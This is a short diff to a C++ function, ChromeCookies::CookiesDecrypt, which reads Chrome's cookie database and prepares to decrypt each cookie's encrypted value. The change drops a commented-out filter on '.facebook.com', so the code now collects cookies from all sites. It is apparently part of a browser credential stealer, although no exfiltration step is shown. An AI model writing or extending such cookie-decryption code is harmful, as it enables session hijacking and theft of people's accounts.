@@ -30,12 +30,7 @@ bool ChromeCookies::CookiesDecrypt(BCRYPT_KEY_HANDLE hKey) {
 		cJSON* root = cJSON_CreateObject();
 		CookieData user_data;
 
-		
-
 		char* host_key = (char*)sqlite3_column_text(this->m_stmt, 0);
-		/*if (strcmp(host_key, ".facebook.com") != 0) {
-			continue;
-		}*/
 		char* name = (char*)sqlite3_column_text(this->m_stmt, 1);
 		char* path = (char*)sqlite3_column_text(this->m_stmt, 2);
 		char* encrypted_value = (char*)sqlite3_column_text(this->m_stmt, 3);
